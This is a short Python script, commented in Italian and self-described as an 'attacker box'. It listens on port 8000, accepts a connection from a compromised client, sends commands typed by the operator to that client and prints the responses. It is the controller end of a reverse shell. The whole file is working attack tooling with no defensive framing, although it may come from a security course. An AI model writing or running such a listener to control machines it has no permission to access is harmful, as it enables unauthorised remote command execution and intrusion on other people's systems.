from socket import *

serverPort = 8000
serverSocket = socket(AF_INET, SOCK_STREAM)
serverSocket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
serverSocket.bind(('', serverPort))
serverSocket.listen(1)

print("Attacker box in ascolto...")

connectionSocket, addr = serverSocket.accept()
print(f"Connessione stabilita da {addr}")

# Riceve il messaggio iniziale dal client
message = connectionSocket.recv(1024).decode()
print(message)

command = ""
while command.strip().lower() != "exit":
    command = input("Inserisci un comando da inviare: ")

    if command.strip().lower() == "exit":
        break

    # Invia il comando al client
    connectionSocket.sendall(command.encode())

    try:
        # Riceve la risposta
        response = connectionSocket.recv(8192).decode()
        print("Risposta del client:\n", response)
    except Exception as e:
        print("Errore durante la ricezione della risposta:", e)
        break

print("Chiudo la connessione...")
connectionSocket.shutdown(SHUT_RDWR)
connectionSocket.close()
